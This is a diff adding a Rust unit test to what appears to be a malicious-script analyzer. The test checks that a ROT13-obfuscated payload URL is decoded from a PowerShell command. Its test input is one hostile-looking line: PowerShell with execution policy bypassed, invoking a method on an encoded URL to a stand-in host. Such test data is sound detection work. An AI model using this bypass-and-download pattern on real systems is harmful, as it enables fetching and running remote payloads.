@@ -23141,6 +23141,30 @@ mod inline_b64_url_tests {
 
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod rot13_url_tests {
+    use crate::traits::Trait;
+    use crate::{analyze, Config};
+
+    #[test]
+    fn rot13_url_in_recovered_powershell_argument_is_extracted() {
+        let script = br#"powershell -ExecutionPolicy Bypass -Command "[Fiber.Program]::Main('uggcf://rknzcyr.pbz/cnlybnq.cat')""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::DownloadInDeobText { src, .. }
+                    if src == "https://example.com/payload.png"
+                )
+            }),
+            "ROT13 URL was not extracted from recovered PowerShell command: {:?}",
+            report.traits
+        );
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod deob_scan_noise_filter_tests {
     use crate::traits::Trait;
     use crate::{analyze, Config};
